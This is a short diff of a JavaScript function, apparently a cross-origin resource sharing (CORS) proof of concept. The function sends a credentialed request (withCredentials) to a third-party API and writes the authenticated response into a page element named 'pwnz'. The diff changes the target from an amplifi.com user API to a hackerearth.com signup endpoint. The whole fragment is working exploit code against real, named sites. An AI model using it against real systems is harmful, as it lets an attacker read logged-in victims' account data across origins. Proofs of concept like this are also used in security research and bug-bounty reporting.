@@ -16,7 +16,7 @@ function cors() {
       document.getElementById("pwnz").innerHTML = this.responseText;
     }
   };
-  xhttp.open("GET", "https://client.amplifi.com/api/user/", true);
+  xhttp.open("GET", "https://www.hackerearth.com/api/v1/sparta/auth/signup/?sxhr=true&source=homepage", true);
   xhttp.withCredentials = true;
   xhttp.send();
 }
